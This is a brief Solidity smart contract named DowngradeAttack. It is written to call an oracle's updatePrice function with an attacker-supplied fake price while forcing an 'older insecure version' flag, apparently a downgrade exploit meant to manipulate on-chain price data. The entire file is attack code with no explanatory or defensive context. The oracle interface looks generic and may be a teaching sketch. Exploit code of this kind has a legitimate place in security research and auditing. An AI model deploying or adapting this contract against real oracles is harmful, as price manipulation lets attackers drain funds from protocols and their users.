pragma solidity ^0.8.21;

interface StandardizedOracle {
    function updatePrice(uint256 price, uint8 version) external;
}

contract DowngradeAttack {
    StandardizedOracle public oracle;

    constructor(address _oracle) {
        oracle = StandardizedOracle(_oracle);
    }

    function attack(uint256 fakePrice) external {
        uint8 insecureVersion = 1; // older insecure version
        oracle.updatePrice(fakePrice, insecureVersion);
    }
}
